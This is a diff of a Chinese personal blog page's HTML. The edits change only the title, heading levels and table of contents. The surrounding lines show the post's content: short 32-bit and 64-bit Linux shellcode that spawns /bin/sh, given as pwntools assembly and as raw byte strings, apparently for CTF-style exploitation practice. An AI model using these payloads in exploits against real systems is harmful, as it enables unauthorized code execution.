@@ -45,7 +45,7 @@ body::-webkit-scrollbar-thumb:hover {
 </style>
 
 
-<title>较为简短的shellcode - P3troL1er 的个人博客</title>
+<title>较为简短的shellcode - P3troL1er 的个人博客-P3troL1er的个人技术博客-每一次相遇，说不定都是意外惊喜</title>
 
 
 <meta name="generator" content="Hugo Eureka 0.9.3" />
@@ -526,7 +526,7 @@ body::-webkit-scrollbar-thumb:hover {
 <blockquote>
 <p>有些时候因为栈的原因，程序运行时会破坏shellcode，这时候可以加一堆ret来抬高栈，也可以选择更为简短的shellcode</p>
 </blockquote>
-<h1 id="32位shellcode">32位shellcode</h1>
+<h2 id="32位shellcode">32位shellcode</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode_32</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s1">xor    ecx, ecx
@@ -541,13 +541,13 @@ body::-webkit-scrollbar-thumb:hover {
 </span></span><span class="line"><span class="cl"><span class="p">)</span>
 </span></span></code></pre></div><p>或</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode_32</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s1">&#39;</span>
-</span></span></code></pre></div><h2 id="效果对比">效果对比</h2>
+</span></span></code></pre></div><h3 id="效果对比">效果对比</h3>
 <p>
         <a data-fancybox="gallery" href="/image/Pasted%20image%2020230102195803.png">
             <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230102195803.png" />
         </a>
     </p>
-<h1 id="64位shellcode">64位shellcode</h1>
+<h2 id="64位shellcode">64位shellcode</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode_64</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s1">dec    eax
@@ -569,7 +569,7 @@ body::-webkit-scrollbar-thumb:hover {
 </span></span><span class="line"><span class="cl"><span class="p">)</span>
 </span></span></code></pre></div><p>或</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode_64</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class="s1">&#39;</span>
-</span></span></code></pre></div><h2 id="效果对比-1">效果对比</h2>
+</span></span></code></pre></div><h3 id="效果对比-1">效果对比</h3>
 <p>
         <a data-fancybox="gallery" href="/image/Pasted%20image%2020230102200025.png">
             <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230102200025.png" />
@@ -732,14 +732,18 @@ body::-webkit-scrollbar-thumb:hover {
 >
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#32位shellcode">32位shellcode</a>
+    <li>
       <ul>
-        <li><a href="#效果对比">效果对比</a></li>
-      </ul>
-    </li>
-    <li><a href="#64位shellcode">64位shellcode</a>
-      <ul>
-        <li><a href="#效果对比-1">效果对比</a></li>
+        <li><a href="#32位shellcode">32位shellcode</a>
+          <ul>
+            <li><a href="#效果对比">效果对比</a></li>
+          </ul>
+        </li>
+        <li><a href="#64位shellcode">64位shellcode</a>
+          <ul>
+            <li><a href="#效果对比-1">效果对比</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
